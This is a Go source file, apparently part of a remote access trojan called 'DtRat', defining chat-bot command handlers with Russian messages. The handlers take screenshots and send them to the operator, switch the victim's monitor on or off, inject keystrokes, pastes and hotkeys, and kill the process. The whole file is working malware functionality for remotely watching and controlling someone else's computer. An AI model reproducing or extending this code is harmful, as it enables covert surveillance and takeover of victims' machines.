package rat

import (
	"dtrat/bot"
	"dtrat/config"
	"os"
)

func (r *Rat) startCmd() {
	r.Bot.Send("Вас приветствует DtRat %s!\nвыполните /help чтобы узнать как использовать DtRat.", config.Version)
}

func (r *Rat) defaultCmd() {
	r.Bot.Send("Неизвестная команда, используйте /help что-бы получить спискок доступных команд и справку по их использованию")
}

func (r *Rat) helpCmd() {
	r.Bot.Send(helpText)
}

func (r *Rat) killCmd() {
	r.Bot.Send("Остоновка процессов...")
	r.internalClose(nil)
}

func (r *Rat) screenshotCmd() {
	screenshot, err := r.Engine.System.Screenshot()
	defer os.Remove(screenshot)

	if err != nil {
		r.Bot.Send("Ошика: %v", err)
		return
	}

	r.Bot.SendFile(screenshot)
}

func (r *Rat) monitorCmd(args string) {
	if args != "on" && args != "off" {
		r.Bot.Send("Используйте /monitor [on|off]")
		return
	}

	var err error = nil
	switch args {
	case "on":
		err = r.Engine.System.MonitorState(true)
	case "off":
		err = r.Engine.System.MonitorState(false)
	}

	if err != nil {
		r.Bot.Send("Ошибка: %v", err)
		return
	}

	switch args {
	case "on":
		r.Bot.Send("Монитор включен")
		return
	case "off":
		r.Bot.Send("Монитор выключен")
		return
	}
}

/*
/keyboard [press|paste|hotkey] STRING
press - нажатие клавиши
paste - вставка текста
hotkey - нажатие хоткея
*/
func (r *Rat) keyboardCmd(args string) {
	cmd, arg := bot.ParseCommand(args)

	var err error
	switch cmd {
	case "press":
		err = r.Engine.System.PressKey(arg)
	case "paste":
		err = r.Engine.System.Paste(arg)
	case "hotkey":
		err = r.Engine.System.PressHotKey(arg)
	default:
		r.Bot.Send("Неизвестное действие: %s", cmd)
		return
	}

	if err != nil {
		r.Bot.Send("Ошибка: %v", err)
		return
	}

	r.Bot.Send("Успешно выполнено!")
}
